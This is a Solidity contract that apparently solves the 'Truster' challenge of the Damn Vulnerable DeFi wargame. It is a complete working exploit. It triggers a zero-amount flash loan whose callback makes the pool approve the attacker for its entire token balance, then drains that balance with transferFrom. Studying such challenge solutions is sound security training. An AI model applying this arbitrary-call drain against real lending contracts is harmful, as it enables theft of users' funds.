// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterAttack {
    constructor(address _pool, address _token, address recovery) {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        DamnValuableToken token = DamnValuableToken(_token);
        uint256 balance = token.balanceOf(_pool);

        // Step 1: flashLoan with 0 amount, make pool approve us
        pool.flashLoan(
            0,
            msg.sender,
            _token,
            abi.encodeCall(token.approve, (address(this), balance))
        );

        // Step 2: drain pool to recovery
        token.transferFrom(_pool, recovery, balance);
    }
}
